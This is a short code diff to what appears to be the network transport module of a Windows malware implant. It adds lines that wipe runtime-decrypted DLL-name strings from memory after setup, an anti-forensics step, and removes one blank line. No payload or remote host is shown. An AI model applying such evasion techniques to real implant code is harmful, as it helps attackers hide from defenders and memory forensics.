@@ -263,6 +263,10 @@ BOOL TransportInit( ) {
         }
     }
 
+    // zero out decrypted strings
+    mem_set(d_kernel32,0x0,strlen(d_kernel32));
+    mem_set(d_advapi32,0x0,strlen(d_advapi32));
+    mem_set(d_iphlpapi,0x0,strlen(d_iphlpapi));
 
     return Success;
 }
@@ -451,7 +455,6 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     WinHttpCloseHandle( hConnect );
     WinHttpCloseHandle( hRequest );
 #endif
-
 
     return Successful;
 }
